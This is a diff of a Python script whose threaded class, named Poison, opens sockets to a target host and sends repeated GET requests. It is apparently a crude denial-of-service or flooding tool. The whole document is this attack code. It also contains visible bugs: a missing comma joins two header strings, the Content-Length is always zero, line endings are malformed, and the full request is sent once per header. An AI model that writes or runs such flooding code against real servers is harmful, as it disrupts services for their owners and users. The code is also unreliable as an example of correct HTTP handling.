@@ -15,28 +15,29 @@ class Poison (threading.Thread):
         url = self.url
         port = self.port
 
-        sock.settimeout(4)
-
         print(f'Connecting to {url}:{port}')
 
         if(self.type_name == "http_attack"):
-            http_get_attacks(url, self.port)
+            http_get_attack(sock, url, port)
         else:
             sock.connect((url, port))
+
         time.sleep(1)
         sock.close()
 
 def http_get_attack(sock, url_string, port):
     headers = [
         "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
-        "Accept-Language: en-us,en;q=0.5"
+        "Content-Length: {}".format(random.randint(0, 0))
     ]
-    message = "Get /? {} HTTP/1.1\r\n".format(str(random.randint(0, 2000))).encode("utf-8")
+    message = "GET / HTTP/1.1\n"
+
+    data = message + "\n".join(headers)
 
     try:
         sock.connect((url_string, port))
         for header in headers:
-            sock.send(bytes(bytes("{}\r\n".format(header).encode("utf-8"))))
+            sock.send(data.encode("utf-8"))
     except Exception as e:
         print("Error:", e)
 
